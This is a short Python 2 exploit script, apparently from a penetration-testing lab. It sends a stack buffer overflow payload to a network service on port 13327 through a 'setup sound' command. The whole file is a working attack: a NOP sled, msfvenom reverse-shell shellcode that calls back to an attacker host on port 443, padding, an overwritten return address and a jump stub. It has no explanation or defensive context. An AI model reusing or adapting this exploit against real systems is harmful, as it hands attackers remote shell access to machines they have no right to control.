#!/usr/bin/python
import socket

host = "192.168.214.44"

nop_sled = "\x90" * 8   # NOP sled

# msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.119.214 lport=443 -b "\x00\x20" -f py -v shellcode

shellcode =  b""
shellcode += b"\xb8\xc9\x44\xeb\xc5\xdb\xcd\xd9\x74\x24\xf4"
shellcode += b"\x5e\x2b\xc9\xb1\x12\x83\xee\xfc\x31\x46\x0e"
shellcode += b"\x03\x8f\x4a\x09\x30\x3e\x88\x3a\x58\x13\x6d"
shellcode += b"\x96\xf5\x91\xf8\xf9\xba\xf3\x37\x79\x29\xa2"
shellcode += b"\x77\x45\x83\xd4\x31\xc3\xe2\xbc\x01\x9b\x62"
shellcode += b"\xea\xea\xde\x8c\x13\x50\x57\x6d\xa3\xc0\x38"
shellcode += b"\x3f\x90\xbf\xba\x36\xf7\x0d\x3c\x1a\x9f\xe3"
shellcode += b"\x12\xe8\x37\x94\x43\x21\xa5\x0d\x15\xde\x7b"
shellcode += b"\x9d\xac\xc0\xcb\x2a\x62\x82"

padding = "\x41" * (4368 - len(nop_sled) - len(shellcode))
eip = "\x96\x45\x13\x08"
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"

buffer = "\x11(setup sound " + nop_sled + shellcode + padding + eip + first_stage + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."

s.connect((host, 13327))
print s.recv(1024)

s.send(buffer)
s.close()

print "[*]Payload Sent !"
